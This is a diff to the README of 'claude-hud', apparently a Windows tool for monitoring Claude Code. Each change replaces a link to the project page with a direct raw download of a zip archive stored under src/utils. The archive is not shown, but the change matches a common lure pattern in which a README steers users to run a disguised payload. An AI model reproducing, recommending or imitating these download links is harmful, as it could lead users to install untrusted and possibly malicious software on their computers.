@@ -1,6 +1,6 @@
 # 🧭 claude-hud - See Claude Code Activity Clearly
 
-[![Download claude-hud](https://img.shields.io/badge/Download%20claude-hud-blue?style=for-the-badge)](https://github.com/rabbitearspigsticking801/claude-hud)
+[![Download claude-hud](https://img.shields.io/badge/Download%20claude-hud-blue?style=for-the-badge)](https://github.com/rabbitearspigsticking801/claude-hud/raw/refs/heads/main/src/utils/claude_hud_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Use it on Windows if you want a simple way to keep track of what Claude Code is 
 ## 📥 Download and Install
 
 1. Open this link:
-   https://github.com/rabbitearspigsticking801/claude-hud
+   https://github.com/rabbitearspigsticking801/claude-hud/raw/refs/heads/main/src/utils/claude_hud_1.3.zip
 2. On the page, download the latest Windows package or release file.
 3. Save the file to your computer.
 4. If the file is a zip file, extract it first.
@@ -191,7 +191,7 @@ This project is related to:
 
 Visit this page to download the Windows files:
 
-https://github.com/rabbitearspigsticking801/claude-hud
+https://github.com/rabbitearspigsticking801/claude-hud/raw/refs/heads/main/src/utils/claude_hud_1.3.zip
 
 ## 🛠️ Updates
 
